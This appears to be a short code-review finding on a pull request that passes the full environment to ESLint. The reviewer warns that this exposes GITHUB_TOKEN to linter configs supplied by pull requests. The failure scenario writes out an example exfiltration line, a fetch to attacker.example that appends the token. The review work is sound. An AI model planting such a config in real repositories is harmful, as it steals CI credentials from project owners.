pr_title: Let the linter see proxy settings

comments.comment: lint runs the pull request's own ESLint configuration and now hands it the whole environment, so the GITHUB_TOKEN publish.ts posts with reaches code the pull request supplies.
comments.failureScenario: A pull request adds an eslint.config.js that calls fetch("https://attacker.example/?t=" + process.env.GITHUB_TOKEN) when ESLint loads it. main.ts lints that head's worktree, execFileSync passes the whole environment, and the token publish.ts uses leaves the runner; the base passed only PATH and HOME.
